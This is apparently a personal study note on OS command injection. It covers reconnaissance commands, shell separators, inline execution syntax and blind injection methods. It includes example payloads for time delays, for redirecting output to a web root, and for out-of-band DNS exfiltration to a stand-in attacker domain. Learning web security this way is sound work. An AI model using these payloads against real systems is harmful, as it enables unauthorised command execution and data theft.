# Injecting OS commands

## Useful commands

|Purpose of command|Linux|Windows|
|---|---|---|
|Name of current user|`whoami`|`whoami`|
|Operating system|`uname -a`|`ver`|
|Network configuration|`ifconfig`|`ipconfig /all`|
|Network connections|`netstat -an`|`netstat -an`|
|Running processes|`ps -ef`|`tasklist`|

## Ways of injecting

- **command separators**
	- <mark style="background: #BBFABBA6;">windows and linux</mark>:
	  -  `&`
	  - `&&`
	  - `|`
	  - `||`
	- <mark style="background: #FFF3A3A6;">Unix-based systems only</mark>:
		- `;`
		- Newline (`0x0a` or `\n`)

- **inline execution** of another injected command (<mark style="background: #FFF3A3A6;">unix-based only</mark>)
  -  `` `x` `` 
  -  ` $(x) `

- the difference between *shell character's behavior* can cause different impact → in-band / blind 
- input apears in *quoted context* (using `"` or `'`) → terminate befrore inject

## Basic

- Use command seprators + command to retrive data. [[unprocessed-obsidians/OLD/WEB/vulnerabilities/Command Injection/payload#basic|example]]

# Blind 

-  the application does not return the output from the command within its _HTTP response_.
## by using time delays

- _ping_ command 
	- ex:  `& ping -c 10 127.0.0.1 &` [[unprocessed-obsidians/OLD/WEB/vulnerabilities/Command Injection/payload#using time delays|payload]]
## by redirecting output

- `>` , `>>`
	- ex: `& whoami > /var/www/static/whoami.txt &` [[unprocessed-obsidians/OLD/WEB/vulnerabilities/Command Injection/payload#by redirecting output|payload]]

## by using out-of-band (OAST)

- *`nslookup`* + inline execution+ a *domain* which the attacker controls: [[unprocessed-obsidians/OLD/WEB/vulnerabilities/Command Injection/payload#by using out-of-band (OAST)|payload]]
	- ex: `& nslookup kgji2ohoyw.web-attacker.com &`
	- ex: ``& nslookup `whoami`.kgji2ohoyw.web-attacker.com &`` => `wwwuser.kgji2ohoyw.web-attacker.com`
